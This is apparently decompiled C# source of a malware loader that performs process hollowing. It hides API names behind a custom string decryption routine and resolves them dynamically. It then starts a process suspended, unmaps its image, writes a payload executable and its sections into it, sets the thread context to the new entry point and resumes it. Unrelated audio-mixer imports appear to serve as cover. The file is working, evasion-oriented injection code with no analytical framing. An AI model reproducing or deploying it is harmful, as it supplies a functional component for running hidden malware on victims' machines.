	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetLineControlsA(int hmxobj, MIXERLINECONTROLS111 pmxlc, int fdwControls);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetDevCapsA(int uMxId, MIXERCAPS11 pmxcaps, int cbmxcaps);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetControlDetailsA(int hmxobj, MIXERCONTROLDETAILS11 pmxcd, int fdwDetails);

	public static bool smethod_0()
	{
		return Environment.OSVersion.Version.Major == 6;
	}

	public static string DecryptData(string Input, string key)
	{
		if (Input == null)
		{
			throw new ArgumentNullException("Input");
		}
		if (key == null)
		{
			throw new ArgumentNullException("key");
		}
		return Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(key)));
	}

	public static byte[] DecryptData(byte[] Input, byte[] key)
	{
		if (Input == null)
		{
			throw new ArgumentNullException("Input");
		}
		if (key == null)
		{
			throw new ArgumentNullException("key");
		}
		checked
		{
			byte b = Input[Input.Length - 1];
			byte[] array = new byte[Input.Length - 2 + 1];
			int num = 0;
			int num2 = Input.Length - 2;
			for (int i = 0; i <= num2; i++)
			{
				if (num >= key.Length)
				{
					num = 0;
				}
				if (i < Input.Length - 1)
				{
					array[i] = Convert.ToByte(unchecked((int)Input[i]) - unchecked(array.Length % key.Length) - unchecked((int)key[num]) + unchecked((int)b));
					num++;
				}
			}
			return array;
		}
	}

	public static void smethod_1(byte[] byte_0, string string_0)
	{
		GStruct0 gstruct0_ = default(GStruct0);
		GStruct4 info = default(GStruct4);
		GStruct5 startup = default(GStruct5);
		GStruct6 process = default(GStruct6);
		GStruct6 thread = default(GStruct6);
		GStruct8 gStruct = default(GStruct8);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		GStruct7 gStruct2 = (GStruct7)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(GStruct7).GetType());
		gCHandle.Free();
		IntPtr ptr = new IntPtr(checked(num + gStruct2.int_0));
		gStruct = (GStruct8)Marshal.PtrToStructure(ptr, gStruct.GetType());
		CP cP = smethod_2<CP>(DecryptData("o8/n356rqJEB ", "1cnj28nXZWMB"), DecryptData("uOTCuPjXw8nqm8Lk+LEB ", "hePJwefJn+Pdxcnl5YEB"));
		GTC gTC = smethod_2<GTC>(DecryptData("0LapqcuSaVAZ ", "vbHLw7G/TUsZ"), DecryptData("or6zm8mgwqTOm9Pbzb/Hrxk= ", "dbHPj7fLsamvbcXDz7HXzxk="));
		RPM rPM = smethod_2<RPM>(DecryptData("vKWYhLeBWYcp ", "raG7s6GvPTsp"), DecryptData("n4OQpqaNvILBtY2dw7eI0tAp ", "e6GZn3e7tZ2hvb1xobG1u8kp"));
		WPM wPM = smethod_2<WPM>(DecryptData("zMKVo8ijVVYc ", "uq7IwK68Skgc"), DecryptData("uNvInNWRnqrSqLTatc7VsM7gHA== ", "ksi2zK6EyMKqrsrKfq6+wsjWHA=="));
		UVS uVS = smethod_2<UVS>(DecryptData("2LOojdUU ", "yNS0xMQU"), DecryptData("ycXGxeau0cvjr+B62sfWrumzuqAU ", "oNqWyMauzJi+ttqKuJK2stS+ysgU"));
		VA vA = smethod_2<VA>(DecryptData("zYiOpcm6S1gb ", "u6/Jwa+9S0kb"), DecryptData("oqy5n9CleJDDpLV9nLwt ", "kbfJzc+nvWe9vcOrb9Ub"));
		STC sTC = smethod_2<STC>(DecryptData("0o2zrc6/dGUX ", "v7PNxbPBT00X"), DecryptData("tpW9n8zNzKjQct3fz5bXsxc= ", "j7PRkbnNs6uxb8fF0bPZ0Rc="));
		RT rT = smethod_2<RT>(DecryptData("s627dq+OfHkw ", "ppq0rJqoNjQw"), DecryptData("kovAg76yoaWzjIBwMA== ", "dJq2uqqaeKC0mpKYMA=="));
		long num2 = 0L;
		long num3 = 0L;
		startup.CB = Strings.Len((object)startup);
		gstruct0_.uint_0 = 65539u;
		IntPtr system = default(IntPtr);
		if ((long)gStruct.uint_0 != 17744L || gStruct2.ushort_0 != 23117 || 0 - (cP(null, string_0, ref process, ref thread, inherit: false, 4u, system, null, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		checked
		{
			int read;
			if (smethod_0())
			{
				gTC(info.intptr_0, ref gstruct0_);
				IntPtr process2 = info.Process;
				int address = (int)(unchecked((long)gstruct0_.uint_13) + 8L);
				int buffer = 0;
				read = 0;
				rPM(process2, address, ref buffer, 4, ref read);
				uVS(info.Process, 0);
			}
			else
			{
				gTC(info.intptr_0, ref gstruct0_);
				IntPtr process3 = info.Process;
				int address2 = (int)(unchecked((long)gstruct0_.uint_13) + 8L);
				read = (int)num2;
				int buffer = 0;
				rPM(process3, address2, ref read, 4, ref buffer);
				num2 = read;
				uVS(info.Process, (int)num2);
			}
			uint num4 = (uint)(int)vA(info.Process, (int)gStruct.gstruct10_0.uint_6, gStruct.gstruct10_0.uint_10, 12288u, 4u);
			if (unchecked((long)num4) == 0L)
			{
				return;
			}
			IntPtr process4 = info.Process;
			int address3 = Convert.ToInt32(num4);
			int size = Convert.ToInt32(gStruct.gstruct10_0.uint_11);
			read = (int)((!smethod_0()) ? num3 : 0L);
			wPM(process4, address3, byte_0, size, out read);
			long num5 = gStruct2.int_0 + 248;
			int num6 = unchecked((int)gStruct.gstruct9_0.ushort_1) - 1;
			GStruct3 gStruct3 = default(GStruct3);
			for (int i = 0; i <= num6; i++)
			{
				ptr = new IntPtr(num + num5 + i * 40);
				gStruct3 = (GStruct3)Marshal.PtrToStructure(ptr, gStruct3.GetType());
				byte[] array = new byte[(int)gStruct3.uint_1 + 1];
				int num7 = (int)(unchecked((long)gStruct3.uint_1) - 1L);
				for (int j = 0; j <= num7; j++)
				{
					array[j] = byte_0[(int)(unchecked((long)gStruct3.uint_2) + unchecked((long)j))];
				}
				IntPtr process5 = info.Process;
				int address4 = Convert.ToInt32(num4 + gStruct3.uint_0);
				int size2 = Convert.ToInt32(gStruct3.uint_1);
				read = (int)(smethod_0() ? 0L : num3);
				wPM(process5, address4, array, size2, out read);
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			IntPtr process6 = info.Process;
			int address5 = (int)(unchecked((long)gstruct0_.uint_13) + 8L);
			read = 0;
			wPM(process6, address5, bytes, 4, out read);
			gstruct0_.uint_16 = num4 + gStruct.gstruct10_0.uint_3;
			sTC(info.intptr_0, ref gstruct0_);
			rT(info.intptr_0);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	private static T smethod_2<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}
}
